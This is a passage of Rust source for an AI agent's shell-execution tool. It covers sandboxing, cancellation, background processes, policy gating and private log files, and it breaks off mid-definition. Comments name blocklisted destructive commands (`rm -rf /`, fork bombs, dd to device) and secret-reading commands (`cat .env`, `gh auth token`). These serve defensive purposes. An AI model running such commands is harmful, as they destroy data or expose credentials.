//! `execute_command` tool.
//!
//! The `ExecContext::token` races the subprocess wait in a `select!`.
//! When the user Ctrl+C's:
//!
//!   1. Reducer emits `Cmd::CancelScope(turn)`.
//!   2. Effect runner cancels the turn's scope token.
//!   3. `run_command`'s cancel branch fires, `terminate_tree` SIGKILLs
//!      the child's whole process group, the driver is aborted, and
//!      `ToolOutcome::Cancelled` flows back to the reducer. (The child
//!      is deliberately NOT `kill_on_drop`, so a Ctrl+B-detached
//!      command survives a clean shutdown — see the spawn site.)
//!
//! End-to-end latency: microseconds plus whatever it takes `SIGKILL`
//! to arrive. No polling loop to "forget" to include.
//!
//! The dangerous-command blocklist is defense-in-depth, not a
//! security boundary: the real boundary is the user's decision to
//! run Mermaid with shell access. But the known destructive shapes
//! (`rm -rf /`, fork bombs, dd to device, etc.) are cheap to catch
//! upfront.

use crate::domain::ProgressEvent;
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::time::{Duration, Instant};

use async_trait::async_trait;
use tokio::io::{AsyncRead, AsyncReadExt, AsyncWriteExt};
use tokio::process::Command;

use crate::domain::{FilesystemPolicy, NetworkPolicy};
use crate::domain::{ManagedProcess, ToolDefinition, ToolMetadata, ToolOutcome, ToolRunMetadata};
use mermaid_model::constants::{COMMAND_MAX_TIMEOUT_SECS, COMMAND_TIMEOUT_SECS};

use super::super::ctx::ExecContext;
use super::ToolExecutor;

/// `execute_command` — spawn a shell, run a command, capture output.
///
/// Honors three escape hatches:
/// - `ExecContext::token` (the main event): cancellation from the
///   reducer aborts the child. This is *the* Ctrl+C fix.
/// - `timeout` argument: model-specified per-call cap (capped at
///   `COMMAND_MAX_TIMEOUT_SECS`). Default `COMMAND_TIMEOUT_SECS`.
/// - Dangerous-command blocklist: refuses obvious destructive
///   patterns before spawning.
pub struct ExecuteCommandTool;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum CommandMode {
    Wait,
    Background,
}

impl CommandMode {
    fn parse(args: &serde_json::Value) -> Result<Self, String> {
        match args.get("mode").and_then(|v| v.as_str()).unwrap_or("wait") {
            "wait" | "foreground" => Ok(Self::Wait),
            "background" => Ok(Self::Background),
            other => Err(format!(
                "execute_command: mode must be 'wait' or 'background', got '{}'",
                other
            )),
        }
    }
}

#[expect(
    clippy::too_many_lines,
    reason = "predates the lint; see .github/baselines/expect_budget.txt"
)]
#[async_trait]
impl ToolExecutor for ExecuteCommandTool {
    fn name(&self) -> &'static str {
        "execute_command"
    }

    fn schema(&self) -> ToolDefinition {
        ToolDefinition {
            name: "execute_command".to_string(),
            description:
                "Run a shell command — PowerShell on Windows, sh on Linux/macOS; write the command in that shell's syntax. Use mode='wait' for finite commands, or mode='background' for dev servers and GUI/daemon-style commands that should keep running after the tool returns. Ctrl+C during foreground execution aborts the child immediately. The session scratchpad directory (for throwaway files) is exported to the child as MERMAID_SCRATCHPAD."
                    .to_string(),
            input_schema: serde_json::json!({
                "type": "object",
                "properties": {
                    "command": { "type": "string", "description": "Shell command to run." },
                    "working_dir": { "type": "string", "description": "Override working directory (absolute)." },
                    "mode": {
                        "type": "string",
                        "enum": ["wait", "background"],
                        "default": "wait",
                        "description": "Use 'background' for long-running servers, daemons, and GUI launchers."
                    },
                    "timeout": {
                        "type": "integer",
                        "description": "Per-call foreground timeout in seconds. Default 30, max 300. Foreground timeout kills the child."
                    },
                    "startup_timeout_secs": {
                        "type": "integer",
                        "description": "Background mode: seconds to watch startup logs for readiness. Default 5, max 30."
                    },
                    "ready_pattern": {
                        "type": "string",
                        "description": "Background mode: text that marks the server/app ready when it appears in the startup log."
                    },
                    "open_url": {
                        "type": "string",
                        "description": "Background mode: URL to open with the default browser after startup."
                    }
                },
                "required": ["command"]
            }),
        }
    }

    async fn execute(&self, args: serde_json::Value, ctx: ExecContext) -> ToolOutcome {
        let Some(command) = args.get("command").and_then(|v| v.as_str()) else {
            return ToolOutcome::error("execute_command requires 'command' (string)", 0.0);
        };

        if contains_dangerous_command(command) {
            return ToolOutcome::error(format!("Dangerous command blocked: {}", command), 0.0);
        }

        // Resolve the effective working directory and decide containment. A
        // cwd inside the session scratchpad stays a plain Shell request; any
        // other out-of-project cwd is allowed but escalated to
        // ExternalDirectory so the gate won't auto-allow even a read-only
        // command run outside the project — closing the working_dir
        // containment bypass.
        let (effective_workdir, within_project) = match args
            .get("working_dir")
            .and_then(|v| v.as_str())
        {
            Some(raw) => match super::path_safety::resolve_path_within(&ctx.workdir, raw) {
                Ok(resolved) => resolved,
                Err(e) => {
                    return ToolOutcome::error(format!("execute_command working_dir: {e}"), 0.0);
                },
            },
            None => (ctx.workdir.clone(), true),
        };
        let containment = classify_cwd(
            within_project,
            &effective_workdir,
            ctx.scratchpad.as_deref(),
        );

        let category = match containment {
            CwdContainment::Project | CwdContainment::Scratchpad => {
                mermaid_runtime::ToolCategory::Shell
            },
            CwdContainment::External => mermaid_runtime::ToolCategory::ExternalDirectory,
        };
        // Scratch containment must be PROVEN, fail closed: the cwd sits in
        // the scratchpad AND every token of the command lexically stays there.
        let scratch_contained = containment == CwdContainment::Scratchpad
            && ctx
                .scratchpad
                .as_deref()
                .is_some_and(|scratch| command_provably_in_scratch(command, scratch));
        let mut policy_request =
            mermaid_runtime::ActionRequest::new("execute_command", category, command.to_string());
        policy_request.command = Some(command.to_string());
        // The gate must resolve command-relative paths against the directory
        // this command actually runs in (`cmd.current_dir` below), not the
        // project root — see `ActionRequest::cwd`.
        policy_request.cwd = Some(effective_workdir.clone());
        if containment == CwdContainment::External {
            policy_request.path = Some(effective_workdir.display().to_string());
        }
        let pending_action = serde_json::json!({
            "tool": "execute_command",
            "args": args.clone(),
            "workdir": effective_workdir.display().to_string(),
            "turn_id": ctx.turn.0,
            "call_id": ctx.call_id.0,
            "task_id": ctx.task_id.clone(),
        });
        // Central safety gate. An Ask decision is handled inside the gate
        // (checkpoint + approval row + blocking outcome). Allow returns the
        // classified risk so we can take the pre-existing Allow-path
        // checkpoint below.
        let plan_write = match super::policy_gate::gate(
            &ctx,
            policy_request,
            &[],
            pending_action.clone(),
            true,
            scratch_contained,
        )
        .await
        {
            super::policy_gate::Gate::Block(outcome) => return outcome,
            super::policy_gate::Gate::Proceed { risk, plan_write } => {
                // A proven scratch-contained command can't touch the project,
                // so there is nothing worth snapshotting.
                if !scratch_contained
                    && ctx.config.safety.checkpoint_on_mutation
                    && risk != mermaid_runtime::RiskClass::ReadOnly
                {
                    let _ = mermaid_runtime::create_checkpoint_for_task(
                        &ctx.workdir,
                        &[],
                        Some(pending_action.clone()),
                        ctx.checkpoint_origin(),
                    );
                }
                plan_write
            },
        };

        let mode = match CommandMode::parse(&args) {
            Ok(mode) => mode,
            Err(error) => return ToolOutcome::error(error, 0.0),
        };
        let shell_payload = serde_json::json!({
            "task_id": ctx.task_id.clone(),
            "turn_id": ctx.turn.0,
            "call_id": ctx.call_id.0,
            "command": command,
            "working_dir": effective_workdir.display().to_string(),
        });
        let _ = mermaid_runtime::run_plugin_hooks("before_shell", &shell_payload);
        if mode == CommandMode::Background {
            let startup_timeout_secs = args
                .get("startup_timeout_secs")
                .or_else(|| args.get("startup_timeout"))
                .and_then(|v| v.as_u64())
                .unwrap_or(5)
                .clamp(1, 30);
            let ready_pattern = args
                .get("ready_pattern")
                .and_then(|v| v.as_str())
                .map(str::to_string);
            let open_url = args
                .get("open_url")
                .and_then(|v| v.as_str())
                .filter(|v| !v.trim().is_empty())
                .map(str::to_string);
            let outcome = run_background_command(
                command,
                &effective_workdir,
                startup_timeout_secs,
                ready_pattern.as_deref(),
                open_url.as_deref(),
                ctx,
            )
            .await;
            let _ = mermaid_runtime::run_plugin_hooks(
                "after_shell",
                &serde_json::json!({
                    "command": command,
                    "status": format!("{:?}", outcome.status),
                    "summary": &outcome.summary,
                }),
            );
            return outcome;
        }

        let timeout_secs = args
            .get("timeout")
            .and_then(|v| v.as_u64())
            .unwrap_or(COMMAND_TIMEOUT_SECS)
            .min(COMMAND_MAX_TIMEOUT_SECS);

        let command = command.to_string();
        let start = Instant::now();
        let progress = ctx.progress.clone();

        // Spawn + wait. `run_command`'s select races four outcomes: subprocess
        // exit, timeout, Esc-cancel, and Ctrl+B detach — the timeout and cancel
        // arms both tree-kill before returning.
        //
        // When network access is denied (`safety.network = "deny"` /
        // `--no-network`) and/or writes are confined (`safety.filesystem =
        // "project"` / `--confine-fs`), the shell is wrapped in the
        // `__sandbox-exec` launcher, which enforces the policy via the
        // platform backend (Linux: seccomp network kill-switch + Landlock
        // write rules; macOS: Seatbelt via sandbox-exec) before running it —
        // so a denied network attempt or out-of-bounds write fails with a
        // signature the completion arm below maps to a clear denial. Platforms
        // WITH a backend (linux/macos) always wrap when a policy is requested —
        // if the probe says the backend is broken, the launcher fails closed
        // (exit 126) rather than running unconfined. Only platforms with no
        // backend at all (Windows until the AppContainer port) downgrade to an
        // unconfined run, with a once-per-process warning.
        let sandbox_expected = cfg!(any(target_os = "linux", target_os = "macos"));
        let net_requested = matches!(ctx.config.safety.network, NetworkPolicy::Deny);
        let fs_requested = matches!(ctx.config.safety.filesystem, FilesystemPolicy::Project);
        let (net_available, fs_available) = sandbox_probes();
        let sandbox_network = net_requested && (sandbox_expected || net_available);
        let sandbox_fs = fs_requested && (sandbox_expected || fs_available);
        if (net_requested && !net_available) || (fs_requested && !fs_available) {
            static DEGRADED_WARN: std::sync::Once = std::sync::Once::new();
            DEGRADED_WARN.call_once(|| {
                if sandbox_expected {
                    tracing::warn!(
                        "sandbox policy requested but the OS sandbox backend probe failed; \
                         sandboxed commands will refuse to run (fail-closed)"
                    );
                } else {
                    tracing::warn!(
                        "sandbox policy requested but no OS sandbox backend exists on this \
                         platform; commands run unconfined"
                    );
                }
            });
        }
        // Write allowlist: the project root (so a build in a subdir can still
        // write repo-root artifacts), the effective workdir (out-of-project
        // commands, separately gated by policy), the system temp dir, and —
        // unix only — /dev (shell redirects like `>/dev/null` are writes).
        let confine_writes: Option<Vec<PathBuf>> = sandbox_fs.then(|| {
            let mut dirs = vec![
                ctx.workdir.clone(),
                effective_workdir.clone(),
                std::env::temp_dir(),
            ];
            if cfg!(unix) {
                dirs.push(PathBuf::from("/dev"));
            }
            dirs.dedup();
            dirs
        });
        // Default: run on a pseudo-terminal — openpty on Unix, ConPTY on
        // Windows — so the child sees a real console (progress bars,
        // isatty-gated tools); on Unix `/dev/tty` additionally resolves to
        // the CAPTURED pty. `[exec] pty = false` or any pre-spawn PTY
        // failure falls back to the pipe path below, which stays fully
        // intact.
        if ctx.config.exec.pty_enabled() {
            let invocation = shell_invocation(&command, sandbox_network, confine_writes.as_deref());
            match run_command_pty(
                &invocation,
                &effective_workdir,
                ctx.scratchpad.as_deref(),
                progress.clone(),
                ctx.token.clone(),
                ctx.background.clone(),
                Duration::from_secs(timeout_secs),
            )
            .await
            {
                Ok(run) => {
                    let outcome = finish_foreground_command(
                        Ok(run),
                        &command,
                        &effective_workdir,
                        start,
                        timeout_secs,
                        sandbox_network,
                        sandbox_fs,
                    );
                    let _ = mermaid_runtime::run_plugin_hooks(
                        "after_shell",
                        &serde_json::json!({
                            "command": command,
                            "status": format!("{:?}", outcome.status),
                            "summary": &outcome.summary,
                        }),
                    );
                    return outcome;
                },
                // Every fallible step in run_command_pty precedes the spawn,
                // so falling back here can never run the command twice.
                Err(err) => {
                    tracing::warn!(error = %err, "PTY exec unavailable; falling back to pipes");
                },
            }
        }

        let mut cmd = build_sandboxed_shell(&command, sandbox_network, confine_writes.as_deref());
        cmd.stdin(Stdio::null())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            // NOT kill-on-drop: the cancel and timeout arms of `run_command`
            // explicitly `terminate_tree` the whole process group (the direct
            // shell is its group leader, so any forked grandchild dies too), so
            // no drop-time backstop is needed on those paths. Crucially, leaving
            // the child un-armed lets a Ctrl+B-detached command survive a clean
            // Mermaid shutdown: the orphaned driver task that still owns this
            // `Child` is aborted at runtime teardown, and a `kill_on_drop(true)`
            // child would then be SIGKILLed despite `mode=background` semantics
            // — inconsistent with a truly backgrounded process (#F16).
            .kill_on_drop(false);

        // Unix: lead a new SESSION, not just a new process group. `setsid()`
        // still makes the child a group leader (sid == pgid == pid), so the
        // cancel/timeout group-kill in `terminate_tree` is unchanged — but a
        // new session has no controlling terminal, so a child that tries to
        // open `/dev/tty` (a `sudo` password prompt, an ssh passphrase read)
        // fails instantly instead of painting its prompt over the TUI and
        // hanging until timeout. `setsid` is async-signal-safe, so a pre_exec
        // closure is fine here (unlike the seccomp/Landlock setup, which needs
        // the `__sandbox-exec` re-exec — see `app::sandbox_exec`). Must NOT be
        // combined with `process_group(0)`: setpgid runs before pre_exec, and
        // `setsid` fails with EPERM for an existing group leader.
        // (Windows kills the tree by pid via `taskkill /T`, no group needed.)
        #[cfg(unix)]
        unsafe {
            cmd.pre_exec(|| {
                rustix::process::setsid()?;
                Ok(())
            });
        }

        cmd.current_dir(&effective_workdir);
        scrub_secret_env(&mut cmd);
        harden_noninteractive_env(&mut cmd);
        export_scratchpad_env(&mut cmd, ctx.scratchpad.as_deref());

        // The timeout now lives INSIDE `run_command`'s select (alongside the
        // Esc-cancel and Ctrl+B arms), so a timed-out command is tree-killed and
        // its driver aborted before we return — the old outer `select!` dropped
        // the future and leaked the process tree.
        let mut outcome = finish_foreground_command(
            run_command(
                cmd,
                progress,
                ctx.token.clone(),
                ctx.background.clone(),
                Duration::from_secs(timeout_secs),
            )
            .await,
            &command,
            &effective_workdir,
            start,
            timeout_secs,
            sandbox_network,
            sandbox_fs,
        );
        // Record that this command WAS the plan write (the gate said so), so
        // the doom-loop breaker disarms on the shell spelling of plan
        // authoring instead of only on `write_file`/`apply_patch`.
        outcome.metadata.plan_file_written =
            plan_write && outcome.status == crate::domain::ToolStatus::Success;
        let _ = mermaid_runtime::run_plugin_hooks(
            "after_shell",
            &serde_json::json!({
                "command": command,
                "status": format!("{:?}", outcome.status),
                "summary": &outcome.summary,
            }),
        );
        outcome
    }
}

/// Map a completed foreground run (either spawn path) onto the tool outcome:
/// sandbox-denial detection, detach registration, timeout/cancel/error
/// shaping, and command metadata. Shared by the pipe and PTY paths so their
/// user-visible semantics cannot drift.
#[expect(
    clippy::too_many_lines,
    reason = "predates the lint; see .github/baselines/expect_budget.txt"
)]
fn finish_foreground_command(
    result: std::io::Result<CommandRunResult>,
    command: &str,
    effective_workdir: &Path,
    start: Instant,
    timeout_secs: u64,
    sandbox_network: bool,
    sandbox_fs: bool,
) -> ToolOutcome {
    let command = command.to_string();
    match result {
        Ok(CommandRunResult::Completed(run)) => {
            let duration_secs = start.elapsed().as_secs_f64();
            let output_len = run.output.len();
            let mut metadata = command_metadata(CommandMetadataInput {
                command: command.clone(),
                working_dir: Some(effective_workdir.display().to_string()),
                exit_code: run.exit_code,
                timed_out: false,
                background: false,
                stdout_lines: run.stdout_lines,
                stderr_lines: run.stderr_lines,
                detected_urls: all_urls(&run.output),
                pid: None,
                log_path: None,
                byte_count: Some(output_len),
            });
            if let Some(kind) = detect_denial(&run, sandbox_network, sandbox_fs) {
                // The sandbox stopped (or very likely stopped) this command.
                // Surface a clear, actionable error instead of a confusing
                // "killed" / opaque permission failure.
                if let ToolMetadata::ExecuteCommand {
                    denied_by_sandbox, ..
                } = &mut metadata.detail
                {
                    *denied_by_sandbox = true;
                }
                let message = match kind {
                    // The Linux SIGSYS signature is precise — the message
                    // stands alone. Every other signature is a hedged text
                    // match, so the original output stays attached.
                    DenialKind::Network if cfg!(target_os = "linux") => {
                        NETWORK_DENIED_MESSAGE.to_string()
                    },
                    DenialKind::Network => format!(
                        "{HEDGED_NETWORK_DENIED_MESSAGE}\n\n--- original output ---\n{}",
                        run.output
                    ),
                    DenialKind::Filesystem => format!(
                        "{FS_DENIED_MESSAGE}\n\n--- original output ---\n{}",
                        run.output
                    ),
                    DenialKind::Ambiguous => format!(
                        "{AMBIGUOUS_DENIED_MESSAGE}\n\n--- original output ---\n{}",
                        run.output
                    ),
                };
                ToolOutcome::error(message, duration_secs).with_metadata(metadata)
            } else {
                ToolOutcome::success(run.output.clone(), "command completed", duration_secs)
                    .with_metadata(metadata)
            }
        },
        Ok(CommandRunResult::Detached { pid, log_path }) => {
            // Ctrl+B moved this command to the background.
            let duration_secs = start.elapsed().as_secs_f64();
            let log_path_str = log_path.display().to_string();
            let output = format!(
                "Moved to background.\nPID: {pid}\nLog: {log_path_str}\nManage it with /processes, /logs {pid}, /stop {pid}."
            );
            let process = ManagedProcess {
                id: format!("bg-{pid}"),
                pid,
                command: command.to_string(),
                cwd: Some(effective_workdir.display().to_string()),
                log_path: log_path_str.clone(),
                detected_url: None,
                status: mermaid_runtime::ProcessStatus::Running,
            };
            let mut metadata = command_metadata(CommandMetadataInput {
                command: command.to_string(),
                working_dir: Some(effective_workdir.display().to_string()),
                exit_code: None,
                timed_out: false,
                background: true,
                stdout_lines: 0,
                stderr_lines: 0,
                detected_urls: Vec::new(),
                pid: Some(pid),
                log_path: Some(log_path_str),
                byte_count: Some(output.len()),
            });
            metadata.process = Some(process);
            ToolOutcome::success(output, "moved to background", duration_secs)
                .with_metadata(metadata)
        },
        Ok(CommandRunResult::Cancelled) => ToolOutcome::cancelled(),
        Ok(CommandRunResult::TimedOut) => {
            let message = format!(
                "Command timed out after {} seconds and was killed. \
                     For dev servers, GUI apps, or other long-running commands, call execute_command with mode=\"background\".",
                timeout_secs
            );
            let duration_secs = start.elapsed().as_secs_f64();
            ToolOutcome::error(message, duration_secs).with_metadata(command_metadata(
                CommandMetadataInput {
                    command: command.clone(),
                    working_dir: Some(effective_workdir.display().to_string()),
                    exit_code: None,
                    timed_out: true,
                    background: false,
                    stdout_lines: 0,
                    stderr_lines: 0,
                    detected_urls: Vec::new(),
                    pid: None,
                    log_path: None,
                    byte_count: None,
                },
            ))
        },
        Err(e) => {
            let duration_secs = start.elapsed().as_secs_f64();
            ToolOutcome::error(format!("Command failed: {}", e), duration_secs).with_metadata(
                command_metadata(CommandMetadataInput {
                    command: command.clone(),
                    working_dir: Some(effective_workdir.display().to_string()),
                    exit_code: None,
                    timed_out: false,
                    background: false,
                    stdout_lines: 0,
                    stderr_lines: 0,
                    detected_urls: Vec::new(),
                    pid: None,
                    log_path: None,
                    byte_count: None,
                }),
            )
        },
    }
}

#[derive(Debug)]
struct BackgroundStartup {
    ready_message: String,
    log_excerpt: String,
    detected_url: Option<String>,
}

async fn run_background_command(
    command: &str,
    workdir: &Path,
    startup_timeout_secs: u64,
    ready_pattern: Option<&str>,
    open_url: Option<&str>,
    ctx: ExecContext,
) -> ToolOutcome {
    let start = Instant::now();

    {
        let log_path = background_log_path();
        let pid =
            match launch_background_process(command, workdir, &log_path, ctx.scratchpad.as_deref())
                .await
            {
                Ok(pid) => pid,
                Err(error) => {
                    return ToolOutcome::error(error, start.elapsed().as_secs_f64());
                },
            };

        let startup = match wait_for_background_startup(
            pid,
            &log_path,
            startup_timeout_secs,
            ready_pattern,
            &ctx,
        )
        .await
        {
            Ok(startup) => startup,
            Err(BackgroundWaitError::Cancelled) => {
                mermaid_model::utils::terminate_tree(pid, mermaid_model::utils::Grace::Graceful)
                    .await;
                return ToolOutcome::cancelled();
            },
            Err(BackgroundWaitError::ExitedEarly(log_excerpt)) => {
                return ToolOutcome::error(
                    format!(
                        "Background command exited during startup. Log: {}\n\n{}",
                        log_path.display(),
                        log_excerpt
                    ),
                    start.elapsed().as_secs_f64(),
                );
            },
        };

        let opened = if let Some(url) = open_url {
            Some((url.to_string(), open_browser_url(url).await))
        } else {
            None
        };

        let mut output = format!(
            "Background command started.\nPID: {}\nLog: {}\n{}\n",
            pid,
            log_path.display(),
            startup.ready_message
        );
        if let Some(url) = startup.detected_url.as_ref() {
            output.push_str(&format!("Detected URL: {}\n", url));
        }
        if let Some((url, result)) = opened {
            match result {
                Ok(()) => output.push_str(&format!("Opened URL: {}\n", url)),
                Err(error) => output.push_str(&format!("Open URL failed: {} ({})\n", url, error)),
            }
        }
        if !startup.log_excerpt.trim().is_empty() {
            output.push_str("\n--- startup output ---\n");
            output.push_str(&startup.log_excerpt);
        }

        let duration_secs = start.elapsed().as_secs_f64();
        let log_path_str = log_path.display().to_string();
        let detected_urls = startup.detected_url.iter().cloned().collect::<Vec<_>>();
        let process = ManagedProcess {
            id: format!("bg-{}", pid),
            pid,
            command: command.to_string(),
            cwd: Some(workdir.display().to_string()),
            log_path: log_path_str.clone(),
            detected_url: startup.detected_url.clone(),
            status: mermaid_runtime::ProcessStatus::Running,
        };
        let byte_count = output.len();
        let mut metadata = command_metadata(CommandMetadataInput {
            command: command.to_string(),
            working_dir: Some(workdir.display().to_string()),
            exit_code: None,
            timed_out: false,
            background: true,
            stdout_lines: startup.log_excerpt.lines().count(),
            stderr_lines: 0,
            detected_urls,
            pid: Some(pid),
            log_path: Some(log_path_str),
            byte_count: Some(byte_count),
        });
        metadata.process = Some(process);
        ToolOutcome::success(output, "background process started", duration_secs)
            .with_metadata(metadata)
    }
}

#[cfg(not(target_os = "windows"))]
async fn launch_background_process(
    command: &str,
    workdir: &Path,
    log_path: &Path,
    scratchpad: Option<&Path>,
) -> Result<u32, String> {
    // Pre-create the log owner-only with O_EXCL BEFORE the launcher runs, so a
    // symlink pre-planted at the predictable path can't redirect the script's
    // `: > "$log"` / output redirects to a victim file (#F15), and the captured
    // output stays owner-readable on top of the 0700 private dir (#F14). The
    // launcher then truncates this regular file in place, preserving its perms.
    create_log_file_blocking(log_path).map_err(|e| {
        format!(
            "failed to create background log {}: {e}",
            log_path.display()
        )
    })?;
    let mut launcher = Command::new("sh");
    launcher
        .arg("-c")
        .arg(
            // `setsid` (when present) makes the backgrounded command a new
            // session/process-group leader, so its pid (`$!`) IS its group id and
            // `terminate_tree` can later group-kill the whole subtree rather than
            // orphaning grandchildren. Falls back to `nohup` on hosts without
            // setsid (e.g. stock macOS), where the bare-pid kill still applies.
            r#"log=$MERMAID_BG_LOG
cmd=$MERMAID_BG_COMMAND
: > "$log" || exit 125
if command -v setsid >/dev/null 2>&1; then
  setsid sh -c "$cmd" > "$log" 2>&1 < /dev/null &
else
  nohup sh -c "$cmd" > "$log" 2>&1 < /dev/null &
fi
printf '%s\n' "$!""#,
        )
        .env("MERMAID_BG_LOG", log_path)
        .env("MERMAID_BG_COMMAND", command)
        .current_dir(workdir)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    scrub_secret_env(&mut launcher);
    harden_noninteractive_env(&mut launcher);
    export_scratchpad_env(&mut launcher, scratchpad);

    let output = launcher
        .output()
        .await
        .map_err(|e| format!("failed to launch background command: {}", e))?;
    if !output.status.success() {
        return Err(format!(
            "background launcher failed: {}",
            String::from_utf8_lossy(&output.stderr)
        ));
    }
    let stdout = String::from_utf8_lossy(&output.stdout);
    stdout.trim().parse::<u32>().map_err(|e| {
        format!(
            "background launcher did not return a pid: {} ({})",
            stdout, e
        )
    })
}

/// Windows: spawn the command detached (no console, own process group) with
/// output redirected to the log file, and return its PID. tokio's `Child`
/// defaults to `kill_on_drop(false)`, so dropping the handle leaves the
/// process running — the OS owns its lifetime from here.
#[cfg(target_os = "windows")]
async fn launch_background_process(
    command: &str,
    workdir: &Path,
    log_path: &Path,
    scratchpad: Option<&Path>,
) -> Result<u32, String> {
    use mermaid_model::utils::{CREATE_NEW_PROCESS_GROUP, CREATE_NO_WINDOW};
    let log = std::fs::File::create(log_path).map_err(|e| {
        format!(
            "failed to create background log {}: {e}",
            log_path.display()
        )
    })?;
    let log_err = log
        .try_clone()
        .map_err(|e| format!("failed to clone background log handle: {e}"))?;
    let mut launcher = Command::new(powershell_program());
    launcher
        .args(["-NoProfile", "-NonInteractive", "-Command"])
        .arg(command)
        .current_dir(workdir)
        .stdin(Stdio::null())
        .stdout(Stdio::from(log))
        .stderr(Stdio::from(log_err))
        // CREATE_NO_WINDOW, not DETACHED_PROCESS: PowerShell needs a console
        // (hidden is fine) or it dies during startup; see proc.rs.
        .creation_flags(CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP);
    scrub_secret_env(&mut launcher);
    harden_noninteractive_env(&mut launcher);
    export_scratchpad_env(&mut launcher, scratchpad);
    let child = launcher
        .spawn()
        .map_err(|e| format!("failed to launch background command: {e}"))?;
    child
        .id()
        .ok_or_else(|| "background command produced no pid".to_string())
}

#[derive(Debug)]
enum BackgroundWaitError {
    Cancelled,
    ExitedEarly(String),
}

async fn wait_for_background_startup(
    pid: u32,
    log_path: &Path,
    startup_timeout_secs: u64,
    ready_pattern: Option<&str>,
    ctx: &ExecContext,
) -> Result<BackgroundStartup, BackgroundWaitError> {
    let start = Instant::now();
    let startup_timeout = Duration::from_secs(startup_timeout_secs);

    loop {
        if ctx.token.is_cancelled() {
            return Err(BackgroundWaitError::Cancelled);
        }

        let last_log = read_log_lossy(log_path).await;
        let detected_url = first_url(&last_log);

        if !process_running(pid).await {
            return Err(BackgroundWaitError::ExitedEarly(tail_lines(&last_log, 40)));
        }

        if let Some(pattern) = ready_pattern {
            if last_log.contains(pattern) {
                return Ok(BackgroundStartup {
                    ready_message: format!("Ready: matched pattern {:?}", pattern),
                    log_excerpt: tail_lines(&last_log, 40),
                    detected_url,
                });
            }
        } else if start.elapsed() >= Duration::from_secs(1) || !last_log.is_empty() {
            return Ok(BackgroundStartup {
                ready_message:
                    "Ready: no ready_pattern provided; process is running after startup check"
                        .to_string(),
                log_excerpt: tail_lines(&last_log, 40),
                detected_url,
            });
        }

        if start.elapsed() >= startup_timeout {
            let ready_message = if let Some(pattern) = ready_pattern {
                format!(
                    "Ready: pattern {:?} was not seen within {}s; process is still running",
                    pattern, startup_timeout_secs
                )
            } else {
                format!(
                    "Ready: startup check reached {}s; process is still running",
                    startup_timeout_secs
                )
            };
            return Ok(BackgroundStartup {
                ready_message,
                log_excerpt: tail_lines(&last_log, 40),
                detected_url,
            });
        }

        tokio::select! {
            _ = ctx.token.cancelled() => return Err(BackgroundWaitError::Cancelled),
            _ = tokio::time::sleep(Duration::from_millis(200)) => {},
        }
    }
}

async fn read_log_lossy(path: &Path) -> String {
    tokio::fs::read_to_string(path).await.unwrap_or_default()
}

#[cfg(not(target_os = "windows"))]
async fn process_running(pid: u32) -> bool {
    Command::new("kill")
        .arg("-0")
        .arg(pid.to_string())
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .await
        .map(|status| status.success())
        .unwrap_or(false)
}

/// Windows: `tasklist` filtered by PID prints the process row only when it
/// exists (otherwise an "INFO: No tasks…" line that doesn't contain the PID).
#[cfg(target_os = "windows")]
async fn process_running(pid: u32) -> bool {
    Command::new("tasklist")
        .args(["/FI", &format!("PID eq {pid}"), "/NH"])
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .output()
        .await
        .map(|out| String::from_utf8_lossy(&out.stdout).contains(&pid.to_string()))
        .unwrap_or(false)
}

// Process-tree termination lives in `mermaid_model::utils::terminate_tree` — the single
// primitive shared by the Esc-cancel path, the foreground timeout, the
// Ctrl+B-detached cleanup, and the daemon's `/stop`/`/restart`. It kills the
// process group (catching grandchildren), not just the direct pid.

/// Build a unique, hard-to-predict path for a command's tee log inside the
/// per-user `0700` private temp dir (#F14). Command stdout/stderr is tee'd here
/// and can contain secrets (`cat .env`, `gh auth token`), so it must NOT land in
/// the world-readable shared system temp dir. Falls back to the system temp dir
/// only if the private dir can't be created — the owner-only + `O_EXCL` create
/// at the use-site (`create_log_file_blocking`) still applies there.
fn background_log_path() -> PathBuf {
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or_default();
    let name = format!("mermaid-bg-{}-{}.log", std::process::id(), nanos);
    match mermaid_model::utils::private_temp_dir() {
        Ok(dir) => dir.join(name),
        Err(_) => std::env::temp_dir().join(name),
    }
}

/// Create (exclusively) the tee log at `path`. On Unix the file is owner-only
/// (`0600`) and opened `O_CREAT | O_EXCL` (via `create_new`): per POSIX that
/// refuses to open — and refuses to follow — a symlink someone pre-planted at
/// the predictable name, so the log write can't be redirected to a victim file
/// (#F15). The `0600` mode keeps the captured stdout/stderr owner-readable on
/// top of the `0700` private dir (#F14).
#[cfg(unix)]
fn create_log_file_blocking(path: &Path) -> std::io::Result<std::fs::File> {
    use std::os::unix::fs::OpenOptionsExt;
    std::fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .mode(0o600)
        .open(path)
}

/// Create the foreground tee log, returning a `tokio` handle. Unix uses the
/// hardened owner-only + `O_EXCL` create above; other platforms fall back to a
/// plain create (the log already lives in the private dir). Best-effort: `None`
/// means "no tee log", which only costs `/logs` tail-ability, not correctness.
fn create_tee_log_blocking(path: &Path) -> Option<tokio::fs::File> {
    #[cfg(unix)]
    let std_file = create_log_file_blocking(path).ok();
    #[cfg(not(unix))]
    let std_file = std::fs::File::create(path).ok();
    std_file.map(tokio::fs::File::from_std)
}

struct CommandMetadataInput {
    command: String,
    working_dir: Option<String>,
    exit_code: Option<i32>,
    timed_out: bool,
    background: bool,
    stdout_lines: usize,
    stderr_lines: usize,
    detected_urls: Vec<String>,
    pid: Option<u32>,
    log_path: Option<String>,
    byte_count: Option<usize>,
}

fn command_metadata(input: CommandMetadataInput) -> ToolRunMetadata {
    ToolRunMetadata {
        detail: ToolMetadata::ExecuteCommand {
            command: input.command,
            working_dir: input.working_dir,
            exit_code: input.exit_code,
            timed_out: input.timed_out,
            background: input.background,
            stdout_lines: input.stdout_lines,
            stderr_lines: input.stderr_lines,
            detected_urls: input.detected_urls,
            pid: input.pid,
            log_path: input.log_path,
            // Set by the completion arm when a sandbox denial is detected; the
            // metadata builder itself never sees the terminating signal.
